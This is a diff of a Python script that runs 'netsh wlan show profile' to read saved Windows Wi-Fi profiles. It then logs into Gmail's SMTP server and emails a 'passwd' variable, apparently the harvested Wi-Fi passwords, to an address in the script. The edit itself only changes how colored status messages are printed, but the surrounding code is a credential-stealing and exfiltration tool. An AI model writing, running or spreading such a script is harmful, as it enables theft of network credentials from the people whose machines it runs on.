@@ -6,7 +6,7 @@
 # Python 3
 
 import subprocess, smtplib, re
-from termcolor import colored
+from termcolor import cprint
 
 show_pro = "netsh wlan show profile"
 wifi = subprocess.check_output(show_pro, shell=True)
@@ -31,18 +31,18 @@ def send_mail():
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.ehlo()
     except:
-        print(colored("Error: Verify Gmail SMTP settings.", 'red'))
+        cprint("Error: Verify Gmail SMTP settings.", 'red')
         exit()
     try:
         server.login(email, password)
     except:
-        print(colored("Error: Authentication error.", 'red'))
+        cprint("Error: Authentication error.", 'red')
         exit()
     try:
         server.sendmail(email, email, passwd)
-        print(colored("Done!", 'green'))
+        cprint("Done!", 'green')
     except:
-        print(colored("Error: Failed sending e-mail.", 'red'))
+        cprint("Error: Failed sending e-mail.", 'red')
     server.quit()
 
 send_mail()
